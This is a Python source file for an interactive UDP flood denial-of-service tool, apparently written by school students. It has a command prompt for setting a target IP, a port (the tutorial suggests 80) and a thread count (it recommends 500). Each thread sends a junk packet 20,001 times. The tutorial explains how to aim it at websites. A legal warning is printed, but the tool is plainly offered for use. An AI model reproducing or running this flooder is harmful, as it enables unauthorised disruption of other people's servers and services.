"""
# Chinese version
Author: Lucky Pupil ;
Date:2022.05.01 ;
National: Chinese ;
Project Name: Dos Attack ;
Education: Fifth Grade of Primary School

# English Final version - 2.0:
Editor: HQmonkey ;
Date: 2022.12.25 ;
National: English ;
Project Name: Dos Attack - English;
Education: Sixth Grade of Junior High School
"""

# import some modules
import socket #Import Attack Module
from threading import Thread # Import multi-threaded Module
from cmd import Cmd# Import_Terminal_Command
from sys import exit # For Use 'exit' Function
from time import sleep# For Use 'sleep' Function

# define some variables
str_byte = 'I am attack you' * 500
randbyte = str_byte.encode() # create Attack Packet
so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # create Attack Server
threads = [] # Multithreaded list

# define some functions
class Main(Cmd):
	prompt = 'dos_attack-command>' # Terminal prefix
	intro = 'This tool is only for learning and forced use, not for joke\nAccording to Article 285 of the <Criminal Law>\nWhoever invades computer information systems in the fields of State affairs, \nnational defense construction or advanced science and technology \nshall be sentenced to fixed-term imprisonment of not more than three years or criminal detention.' #Terminal init
	def do_tutorial(self,arg): #How To Use Functions
		'Teach you how to use this tool'
		self.tutorial(arg)

	def do_set_thread_num(self,arg): # Set the number of threads to call the function
		'Set the number of attack threads'
		self.set_thread_num(arg)

	def do_set_port(self,arg): # Attack port setting call function
		'Set attack port'
		self.set_port(arg)

	def do_set_ip(self,arg): #Use 'set_ip' Function
		'Set attack IP'
		self.set_ip(arg)

	def do_attack(self,arg): # Use 'attack' Function
		'Attack Function'
		self.attack(arg)

	def do_exit(self,arg): # Use 'exit' Function
		'Exit Function'
		self.exit(arg)

	def exit(self,arg): # Exit
		exit(0)

	def tutorial(self,chose): #Tutorial
		print('1, you must use the "set_port" command to set the attack target port, typically 80\n')
		sleep(1)
		print('2, you must use the "set_ip" command to set the attack target IP address, note that it is the IP address!\nYou can get the IP address of the web address using the ping command + web address from the commond command line\n')
		sleep(1)
		print('3 you must use the "set_thread_num" command to set the number of attack threads.\nThe more threads, the more efficient the attack and the more likely the attack will succeed.\nBut not as much as possible. More computer cards are easy to use.\nThe recommended number is 500, depending on your computer.\n')
		sleep(1)
		print('4, use the "attack" command, attack, type "y", you can start the attack, will show the number of attacks, and may be blacked by the site administrator at your own risk.\n')
	def set_thread_num(self,num):
		self.thread = int(num)
		print('Set thread ', num)

	def set_port(self,num): # Set Port
		self.port = int(num)
		print('Set port ', num)

	def set_ip(self,ip): # Set IP
		self.ip = ip
		print('Set IP address ', ip)

	def attack(self,chose):# Attack Function
		chose = input('Are You sure to attack?\nAccording to Article 285 of the <Criminal Law>\nWhoever invades computer information systems in the fields of State affairs, \nnational defense construction or advanced science and technology \nshall be sentenced to fixed-term imprisonment of not more than three years or criminal detention.\nY/n')
		if chose == 'y' or chose == 'Y':
			self.true_to_attack() # Start Attack
		elif chose == 'n' or chose == 'N':
			self.exit()# Exit
		else:
			print('Please input specify') #Try Again
			self.attack()
			
	def true_to_attack_attack(self): # Main attack function
		for i in range(20001):# do 20002 times(You can Set it by yourself)
			so.sendto(randbyte,(self.ip,self.port)) # Send Packets，Usage: 'socket.sendto(data,(IP,port))'
			print('this is the',i+1,'st/nd/rd attack!') # PrintIn

	def true_to_attack_thread(self): # Attack thread startup and setting
		for i in range(1,self.thread+1): # Number of repeated threads
			sleep(0.1) # Prevent jammings
			send = Thread(target=self.true_to_attack_attack,args=()) # Create multithreaded classes
			threads.append(send) # Add to the list
			print(i,"Threads generated successfully") # PrintIn
		for j in threads: # Traversal thread list
			j.start() # Start Thread


	def true_to_attack(self): # Start Attack
		self.true_to_attack_thread()
# run attack
print("use 'tutorial' command to read the tutorial")
print()
print()
print()
print()
print()
Main().cmdloop()
